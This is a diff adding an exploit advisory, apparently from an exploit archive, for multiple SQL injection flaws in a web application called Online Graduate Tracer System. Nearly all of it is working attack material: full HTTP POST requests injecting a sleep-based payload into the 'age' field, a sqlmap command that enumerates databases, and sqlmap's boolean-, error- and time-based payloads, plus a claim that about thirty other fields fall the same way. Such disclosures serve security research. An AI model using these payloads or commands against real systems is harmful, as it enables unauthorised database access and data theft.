@@ -1,0 +1,79 @@
+id: 38379
+date: 03/24/2023
+title: Online Graduate Tracer System - Multiple SQL injection Vulnerabilities
+author: Abdulhakim Öner
+cves: 
+
+## Description 
+A Blind SQL injection vulnerability in the fill-in forms of Online Graduate Tracer System allows remote unauthenticated attackers to execute remote arbitrary SQL commands through "age" parameter. 
+
+## Request PoC
+```
+POST /tracking/ HTTP/1.1
+Host: 192.168.1.100
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: http://192.168.1.100/tracking/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 666
+
+fullname=TKeljbcD&age=24'&sex=&dob=11%2f11%2f1992&cs=&religion=&street=518287&barangay=933877&municipal=149726&province=293419&region=&zipcode=21788&country=767093&course=&batch=&facebook=329348&twitter=488487&phonenumber=197-436-9799&email=dKYxqIen@burpcollaborator.net&estatus=Employed&organization=&profession=503409&type=Working+Fulltime&location=local&location=abroad&status=Permanent&status=Contractual&status=Casual&status=Others&number=1-5+yrs&income=359935&relate=Yes&sreason=621051&nature=792251&company=597673&num=0-5+yrs&num=6-10+yrs&num=10-15+yrs&num=16+yrs+above&mincome=325978&reason=992014&consider=Yes&submit=
+
+```
+
+This request causes a Fatal error. Adding "'%2b(select*from(select(sleep(10)))a)%2b'" to the end of "age" parameter, the response to request was 200 status code with message of OK, but 20 seconds later, which indicates that our sleep 10 command works. 
+
+```
+POST /tracking/ HTTP/1.1
+Host: 192.168.1.100
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: http://192.168.1.100/tracking/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 666
+
+fullname=TKeljbcD&age=24'%2b(select*from(select(sleep(10)))a)%2b'&sex=&dob=11%2f11%2f1992&cs=&religion=&street=518287&barangay=933877&municipal=149726&province=293419&region=&zipcode=21788&country=767093&course=&batch=&facebook=329348&twitter=488487&phonenumber=197-436-9799&email=dKYxqIen@burpcollaborator.net&estatus=Employed&organization=&profession=503409&type=Working+Fulltime&location=local&location=abroad&status=Permanent&status=Contractual&status=Casual&status=Others&number=1-5+yrs&income=359935&relate=Yes&sreason=621051&nature=792251&company=597673&num=0-5+yrs&num=6-10+yrs&num=10-15+yrs&num=16+yrs+above&mincome=325978&reason=992014&consider=Yes&submit=
+
+```
+
+## Exploit with sqlmap
+Save the request from burp to file 
+```
+┌──(root㉿caesar)-[/home/kali/Workstation/sts]
+└─# sqlmap -r sqli.txt -p 'age' --batch --dbs --level=3 --risk=2
+---snip---
+[01:53:49] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
+POST parameter 'age' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 630 HTTP(s) requests:
+---
+Parameter: age (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: fullname=TKeljbcD&age=24' RLIKE (SELECT (CASE WHEN (6534=6534) THEN 24 ELSE 0x28 END)) AND 'ATRa'='ATRa&sex=&dob=11/11/1992&cs=&religion=&street=518287&barangay=933877&municipal=149726&province=293419&region=&zipcode=21788&country=767093&course=&batch=&facebook=329348&twitter=488487&phonenumber=197-436-9799&email=dKYxqIen@burpcollaborator.net&estatus=Employed&organization=&profession=503409&type=Working Fulltime&location=local&location=abroad&status=Permanent&status=Contractual&status=Casual&status=Others&number=1-5 yrs&income=359935&relate=Yes&sreason=621051&nature=792251&company=597673&num=0-5 yrs&num=6-10 yrs&num=10-15 yrs&num=16 yrs above&mincome=325978&reason=992014&consider=Yes&submit=
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: fullname=TKeljbcD&age=24' AND (SELECT 9933 FROM(SELECT COUNT(*),CONCAT(0x7170716271,(SELECT (ELT(9933=9933,1))),0x7178767a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'PwMK'='PwMK&sex=&dob=11/11/1992&cs=&religion=&street=518287&barangay=933877&municipal=149726&province=293419&region=&zipcode=21788&country=767093&course=&batch=&facebook=329348&twitter=488487&phonenumber=197-436-9799&email=dKYxqIen@burpcollaborator.net&estatus=Employed&organization=&profession=503409&type=Working Fulltime&location=local&location=abroad&status=Permanent&status=Contractual&status=Casual&status=Others&number=1-5 yrs&income=359935&relate=Yes&sreason=621051&nature=792251&company=597673&num=0-5 yrs&num=6-10 yrs&num=10-15 yrs&num=16 yrs above&mincome=325978&reason=992014&consider=Yes&submit=
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: fullname=TKeljbcD&age=24' AND (SELECT 7274 FROM (SELECT(SLEEP(5)))gxIn) AND 'maqj'='maqj&sex=&dob=11/11/1992&cs=&religion=&street=518287&barangay=933877&municipal=149726&province=293419&region=&zipcode=21788&country=767093&course=&batch=&facebook=329348&twitter=488487&phonenumber=197-436-9799&email=dKYxqIen@burpcollaborator.net&estatus=Employed&organization=&profession=503409&type=Working Fulltime&location=local&location=abroad&status=Permanent&status=Contractual&status=Casual&status=Others&number=1-5 yrs&income=359935&relate=Yes&sreason=621051&nature=792251&company=597673&num=0-5 yrs&num=6-10 yrs&num=10-15 yrs&num=16 yrs above&mincome=325978&reason=992014&consider=Yes&submit=
+---
+[01:53:50] [INFO] the back-end DBMS is MySQL
+web application technology: PHP 8.2.0, Apache 2.4.54
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+---snip---
+
+```
+
+## The "barangay", "batch", "company", "country", "course", "cs", "dob", "email", "estatus", "facebook", "fullname", "income", "location", "mincome", "municipal", "nature", "number", "organization", "phonenumber", "profession", "province", "region", "relate", "religion", "sex", "sreason", "status", "street", "twitter", "type" and "zipcode" parameters in the POST requests are also vulnerable. They can be exploited in the same way.
+
+#  0day.today [2023-04-04]  #
